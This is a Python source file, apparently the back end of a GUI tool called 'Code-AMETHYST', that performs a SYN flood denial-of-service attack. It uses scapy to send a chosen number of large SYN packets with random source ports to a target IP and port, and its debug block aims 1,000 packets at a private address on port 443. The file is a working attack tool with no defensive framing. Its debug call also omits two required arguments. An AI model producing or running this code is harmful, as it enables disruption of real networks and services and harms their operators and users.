# Code-AMETHYST ver3.1
# Back-end SYN Flood Attack code

# Modules
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort
import customtkinter as ctk

# Attack mechanism
def send_syn(target_ip: str, target_port: int, total_packets: int, label: ctk.CTkLabel, count: int):

    print("Sending " + str(total_packets) + " packets to ip " + target_ip)

    count += 1
    if count == 1:
        label.configure(text="BUSY", text_color="red")

    packet_size = 65000
    
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * packet_size)
    p = ip / tcp / raw

    # Using scapy to flood the IP
    send(p, count=total_packets, verbose=0)
    print("Successfully sent " + str(total_packets) + " packets of " + str(packet_size) + " size to " + target_ip + " on port " + str(target_port))

    count -= 1
    if count == 0:
        label.configure(text="FREE", text_color="green")

# For debugging
if __name__ == "__main__":
    ip = "172.22.8.1"
    port = 443

    send_syn(ip, port, total_packets=1000)